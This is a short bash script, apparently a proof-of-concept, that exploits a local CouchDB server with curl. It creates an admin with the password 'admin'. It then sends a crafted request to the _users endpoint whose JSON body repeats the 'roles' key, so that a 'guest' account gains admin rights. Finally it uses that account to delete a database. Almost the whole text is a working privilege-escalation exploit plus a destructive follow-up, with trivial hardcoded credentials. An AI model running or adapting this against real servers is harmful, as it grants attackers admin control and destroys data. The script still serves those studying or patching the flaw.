#!/bin/bash

#check that the database is up
curl -X GET http://localhost:5984

#get the databases list to demonstrate the privileges
curl -X GET http://localhost:5984/_all_dbs

#put a new database
curl -X PUT http://localhost:5984/records

#admin creation
curl -X PUT http://localhost:5984/_config/admins/admin -d '"admin"'

#create a database with admin's credentials
curl -X PUT http://admin:admin@localhost:5984/coronavirus

#send the tricky request to the Database, that would create guest user with guest password and admin priviliges
curl -X PUT http://localhost:5984/_users/org.couchdb.user:guest -H "Accept: application/json" -H "Content-Type: application/json" -d '{"name": "guest", "password": "guest", "roles": ["_admin"], "roles": [], "type": "user"}'

#delete(privileged operation) table new_recodrs
curl -X DELETE http://guest:guest@localhost:5984/coronavirus


